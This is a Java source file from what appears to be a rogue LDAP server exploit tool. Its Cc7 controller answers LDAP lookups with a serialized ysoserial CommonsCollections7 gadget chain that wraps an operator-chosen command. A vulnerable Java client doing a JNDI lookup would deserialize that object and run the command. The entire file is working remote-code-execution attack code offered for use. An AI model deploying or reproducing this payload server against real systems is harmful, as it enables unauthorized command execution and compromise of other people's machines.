package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.lang.reflect.Method;

import ysoserial.payloads.CommonsCollections7;

import static artsploit.Utilities.serialize;

@LdapMapping(uri = { "/o=cc7" })
public class Cc7 implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        Method m = CommonsCollections7.class.getMethod("getObject", String.class);
        CommonsCollections7 urldnsObj = new CommonsCollections7();
        Object obj  = (Object) m.invoke(urldnsObj, new String[]{Config.command});

        e.addAttribute("javaSerializedData", serialize(obj));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
